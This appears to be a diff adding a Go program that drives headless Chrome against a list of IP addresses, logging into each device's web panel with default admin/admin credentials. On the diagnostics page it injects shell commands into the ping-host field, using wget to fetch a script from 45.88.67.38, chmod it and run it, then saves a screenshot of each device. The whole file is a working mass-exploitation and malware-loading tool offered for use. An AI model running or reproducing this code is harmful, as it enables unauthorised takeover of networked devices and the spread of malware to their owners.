@@ -1,0 +1,216 @@
+package main
+
+import (
+	"bufio"
+	"context"
+	"fmt"
+	"log"
+	"os"
+	"strings"
+	"sync"
+	"time"
+
+	"github.com/chromedp/chromedp"
+)
+
+func main() {
+	// Set the login URL
+	loginURL := "http://%s/#!/login"
+
+	// Set the credentials
+	username := "admin"
+	password := "admin"
+
+	// Read IP addresses from a text file
+	ips, err := readIPsFromFile("ips.txt")
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	// Set the maximum number of IPs to process concurrently
+	concurrentIPs := 50
+
+	// Create a wait group to wait for all IPs to finish processing
+	var wg sync.WaitGroup
+
+	// Create a semaphore to control the number of concurrent IPs
+	sem := make(chan struct{}, concurrentIPs)
+
+	// Iterate over each IP address
+	for _, ip := range ips {
+		ip := strings.TrimSpace(ip)
+		if ip == "" {
+			continue
+		}
+
+		// Acquire a semaphore slot to control concurrency
+		sem <- struct{}{}
+
+		wg.Add(1)
+
+		go func(ip string) {
+			defer func() {
+				// Release the semaphore slot when done processing
+				<-sem
+
+				// Notify the wait group that processing is finished
+				wg.Done()
+			}()
+
+			// Create a new context
+			ctx, cancel := chromedp.NewContext(context.Background())
+			defer cancel()
+
+			// Construct the login URL with the current IP address
+			loginURL := fmt.Sprintf(loginURL, ip)
+
+			// Launch a new browser instance and navigate to the login page
+			if err := chromedp.Run(ctx, chromedp.Navigate(loginURL)); err != nil {
+				log.Println("Failed to navigate to", loginURL, "IP:", ip, "Error:", err)
+				return
+			}
+
+			// Wait for the username input field to be available
+			if err := chromedp.Run(ctx, chromedp.WaitVisible(`[ng-model="form.username"]`)); err != nil {
+				log.Println("Failed to find username input field. IP:", ip, "Error:", err)
+				return
+			}
+
+			// Check if the username field already has a value
+			var usernameValue string
+			if err := chromedp.Run(ctx, chromedp.Value(`[ng-model="form.username"]`, &usernameValue)); err != nil {
+				log.Println("Failed to get username field value. IP:", ip, "Error:", err)
+				return
+			}
+
+			// Enter the username if it's not already present
+			if usernameValue == "" {
+				if err := chromedp.Run(ctx, chromedp.SetValue(`[ng-model="form.username"]`, username)); err != nil {
+					log.Println("Failed to set username. IP:", ip, "Error:", err)
+					return
+				}
+			}
+
+			// Enter the password
+			if err := chromedp.Run(ctx, chromedp.SetValue(`[ng-model="form.password"]`, password)); err != nil {
+				log.Println("Failed to set password. IP:", ip, "Error:", err)
+				return
+			}
+
+			// Submit the login form
+			if err := chromedp.Run(ctx, chromedp.Click(`[ng-click="doLogin()"]`)); err != nil {
+				log.Println("Failed to submit login form. IP:", ip, "Error:", err)
+				return
+			}
+
+			// Wait for the login process to complete
+			if err := chromedp.Run(ctx, chromedp.Sleep(2*time.Second)); err != nil {
+				log.Println("Failed to wait for login completion. IP:", ip, "Error:", err)
+				return
+			}
+
+			// Check if the login was successful
+			if ctx.Err() != nil {
+				log.Println("Login failed. IP:", ip)
+				return
+			}
+
+			log.Println("Login successful! IP:", ip)
+
+			// Redirect to the diagnostics page
+			diagnosticsURL := fmt.Sprintf("http://%s/#!/srg-status-diagnostics", ip)
+			if err := chromedp.Run(ctx, chromedp.Navigate(diagnosticsURL)); err != nil {
+				log.Println("Failed to navigate to diagnostics page. IP:", ip, "Error:", err)
+				return
+			}
+
+			// Wait for the ping host input field to be available
+			if err := chromedp.Run(ctx, chromedp.WaitVisible(`[ng-model="data.pingHost"]`)); err != nil {
+				log.Println("Failed to find ping host input field. IP:", ip, "Error:", err)
+				return
+			}
+
+// Perform the ping test thrice
+for i := 0; i < 3; i++ {
+    // Enter the ping host value
+    pingHost := ";$(wget http://45.88.67.38/a.sh)"
+    if i == 1 {
+        pingHost = ";$(chmod 777 a.sh)"
+    } else if i == 2 {
+        pingHost = ";$(sh a.sh)"
+    }
+    if err := chromedp.Run(ctx, chromedp.SetValue(`[ng-model="data.pingHost"]`, pingHost)); err != nil {
+        log.Println("Failed to set ping host value. IP:", ip, "Error:", err)
+        return
+    }
+    // Trigger the ping test
+    if err := chromedp.Run(ctx, chromedp.Click(`[ng-click="onPingTest()"]`)); err != nil {
+        log.Println("Failed to trigger ping test. IP:", ip, "Error:", err)
+        return
+    }
+    log.Println("Ping test", i+1, "triggered. IP:", ip)
+
+    // Wait for the ping test to complete
+    if err := chromedp.Run(ctx, chromedp.Sleep(2*time.Second)); err != nil {
+        log.Println("Failed to wait for ping test completion. IP:", ip, "Error:", err)
+        return
+    }
+}
+
+			// Capture a screenshot of the page
+			var screenshotData []byte
+			if err := chromedp.Run(ctx, chromedp.Screenshot(`body`, &screenshotData)); err != nil {
+				log.Println("Failed to capture screenshot. IP:", ip, "Error:", err)
+				return
+			}
+
+			// Save the screenshot to a file
+			screenshotPath := fmt.Sprintf("screenshot_%s.png", ip)
+			if err := saveScreenshot(screenshotPath, screenshotData); err != nil {
+				log.Println("Failed to save screenshot. IP:", ip, "Error:", err)
+				return
+			}
+
+			log.Println("Screenshot saved:", screenshotPath)
+		}(ip)
+	}
+
+	// Wait for all IPs to finish processing
+	wg.Wait()
+}
+
+// Read IP addresses from a text file
+func readIPsFromFile(filename string) ([]string, error) {
+	file, err := os.Open(filename)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
+
+	var ips []string
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		ips = append(ips, scanner.Text())
+	}
+
+	if err := scanner.Err(); err != nil {
+		return nil, err
+	}
+
+	return ips, nil
+}
+
+// Save the screenshot data to a file
+func saveScreenshot(path string, data []byte) error {
+	file, err := os.Create(path)
+	if err != nil {
+		return err
+	}
+	defer file.Close()
+
+	if _, err := file.Write(data); err != nil {
+		return err
+	}
+
+	return nil
+}
